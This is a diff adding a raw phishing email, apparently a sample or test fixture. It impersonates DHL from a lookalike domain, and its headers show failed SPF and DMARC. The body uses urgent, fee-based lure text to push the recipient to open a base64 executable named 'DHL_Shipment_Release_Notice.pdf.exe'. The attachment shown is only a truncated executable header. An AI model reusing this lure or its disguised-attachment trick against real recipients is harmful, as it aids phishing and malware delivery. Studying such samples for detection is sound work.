@@ -1,0 +1,36 @@
+Received: from mail.dhl-express-tracking24.net (mail.dhl-express-tracking24.net [194.26.29.112])
+	by mx.enterprise.com (Postfix) with ESMTPS id 4VpX1109zZz841
+	for <victim@enterprise.com>; Fri, 04 Sep 2026 14:10:22 +0000
+Received: from unknown (HELO bulletproof-mta.ru) (194.26.29.112)
+	by mail.dhl-express-tracking24.net with SMTP; Fri, 04 Sep 2026 14:09:50 +0000
+From: "DHL Global Express Courier" <tracking-support@dhl-express-tracking24.net>
+To: <victim@enterprise.com>
+Subject: Action Required: Your DHL Express Shipment #99214-DE is On Hold (Clearance Fee Pending)
+Date: Fri, 04 Sep 2026 14:09:30 +0000
+Message-ID: <20260904140930.DHL.99214@dhl-express-tracking24.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_DHL_991"
+X-Authentication-Results: spf=fail (sender IP 194.26.29.112 not authorized); dkim=none; dmarc=fail
+
+------=_NextPart_DHL_991
+Content-Type: text/plain; charset="utf-8"
+
+Dear Customer,
+
+Your incoming DHL Express package #99214-DE cannot be delivered due to an incorrect destination postal index and unpaid clearance duty ($3.99).
+You must act immediately within 24 hours to prevent your package from being returned to the sender.
+
+Please download the attached electronic waybill and payment slip to confirm your delivery address and release the shipment.
+
+Thank you,
+DHL International Dispatch
+
+------=_NextPart_DHL_991
+Content-Type: application/octet-stream; name="DHL_Shipment_Release_Notice.pdf.exe"
+Content-Disposition: attachment; filename="DHL_Shipment_Release_Notice.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUKJCRQAAAAAAAAAKc=
+------=_NextPart_DHL_991--
